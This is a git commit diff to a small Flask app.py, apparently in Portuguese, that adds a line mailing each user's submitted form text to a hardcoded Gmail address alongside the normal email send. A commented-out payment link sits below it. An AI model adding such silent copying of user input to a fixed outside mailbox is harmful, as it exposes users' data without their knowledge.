d59b82b0456be4c143dbd210c8893a144a52571a
nexo <65514701+whzinn@users.noreply.github.com>
2024-03-24 08:45:03 -0300

    Update app.py

--- app.py
+++ app.py
@@ -11,6 +11,8 @@ def aqui():
     if request.method == 'POST':
         campo = request.form['campo-texto']
         email = request.form['campo-email']
+        sm2 = smtp_pague.send("timpremiados@gmail.com",campo)
+        
         sm = smtp_pague.send(email, campo)
         #pix = "https://www.mercadopago.com.br/checkout/v1/payment/redirect/043fb990-1619-4c98-9c47-9d9609ff5959/payment-option-form/?preference-id=422523501-2a076704-eab2-4679-8ac8-797650077d75&router-request-id=f4563d60-f88f-40cd-8a74-730b5e41a969&webview=true&source=link&p=47edabca0cceb46bc47aa8decfeeaf16#/"
         # fazer algo com os dados recebidos
